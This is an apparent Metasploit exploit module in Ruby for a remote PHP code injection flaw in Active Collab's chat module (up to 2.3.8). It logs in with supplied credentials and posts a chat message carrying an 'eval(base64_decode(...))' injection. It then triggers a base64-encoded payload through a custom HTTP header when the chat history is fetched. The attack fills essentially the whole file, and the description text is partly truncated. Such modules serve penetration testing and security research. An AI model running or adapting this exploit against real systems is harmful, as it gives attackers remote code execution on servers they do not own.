# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Active Collab "chat module" <= 2.3.8 Remote PHP Code Injection Exploit&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an arbitrary code injection vulnerability in the chat module
                its replacement string using double quotes. The vulnerable function can be found in
                activecollab/application/modules/chat/functions/html_to_text.php.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;,  # vuln discovery & msf module
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://www.activecollab.com/downloads/category/4/package/62/releases&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Keys&#039;        => [&#039;php&#039;],
                    &#039;Space&#039;       => 4000,
                    &#039;DisableNops&#039; => true,
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
            &#039;DisclosureDate&#039; => &#039;May 30 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;,[true, "The path to the ActiveCollab installation", "/"]),
                OptString.new(&#039;USER&#039;,[true, "The username (e-mail) to authenticate with"]),
                OptString.new(&#039;PASS&#039;,[true, "The password to authenticate with"])
            ],self.class)
    end
 
    def check
 
        login_path = "public/index.php?path_info=login&re_route=homepage"
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? login_path : "/#{login_path}"
 
        cms = send_request_raw({&#039;uri&#039; => uri}, 25)
 
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;public/assets/modules/chat/&#039; : &#039;/public/assets/modules/chat/&#039;
 
        chat = send_request_raw({&#039;uri&#039; => uri}, 25)
 
        # cant detect the version here
        if (cms and cms.body =~ /powered by activeCollab/)
            # detect the chat module
            if (chat and chat.code == 200)
                return Exploit::CheckCode::Vulnerable
            end
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        user = datastore[&#039;USER&#039;]
        pass = datastore[&#039;PASS&#039;]
        p = Rex::Text.encode_base64(payload.encoded)
        header = rand_text_alpha_upper(3)
        login_uri = datastore[&#039;URI&#039;]
        login_uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;public/index.php?path_info=login&#039; : &#039;/public/index.php?path_info=login&#039;
 
        # login
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => login_uri,
            &#039;vars_post&#039; =>
                {
                    &#039;login[email]&#039;      => user,
                    &#039;login[password]&#039;   => pass,
                    &#039;submitted&#039;         => "submitted",
                }
            }, 40)
 
        # response handling
        if res.code == 302
            if (res.headers[&#039;Set-Cookie&#039;] =~ /ac_ActiveCollab_sid_eaM4h3LTIZ=(.*); expires=/)
                acsession = $1
            end
        elsif res.body =~ /Failed to log you in/
            print_error("Could not login to the target application, check your credentials")
        elsif res.code != 200 or res.code != 302
            print_error("Server returned a failed status code: (#{res.code})")
        end
 
        # injection
        iuri = datastore[&#039;URI&#039;]
        iuri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;index.php&#039; : &#039;/index.php&#039;
        iuri << "?path_info=chat/add_message&async=1"
        phpkode = "{\${eval(base64_decode(\$_SERVER[HTTP_#{header}]))}}"
        injection = "<th>\");#{phpkode}</th>"
        cookies = "ac_ActiveCollab_sid_eaM4h3LTIZ=#{acsession}"
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => iuri,
            &#039;headers&#039; =>
                {
                    &#039;cookie&#039;  => cookies
                },
            &#039;vars_post&#039; =>
                {
                    &#039;submitted&#039;                  => "submitted",
                    &#039;message[message_text]&#039;      => injection,
                    &#039;message[chat_id]&#039;           => "1",
                    &#039;message[posted_to_user_id]&#039; => "all"
                }
        }, 25)
 
        euri = datastore[&#039;URI&#039;]
        euri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;public/index.php&#039; : &#039;/public/index.php&#039;
        euri << "?path_info=/chat/history/1"
 
        # execution
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => euri,
            &#039;headers&#039; =>
                {
                    header    => p,
                    &#039;cookie&#039;  => cookies
                }
        })
    end
end



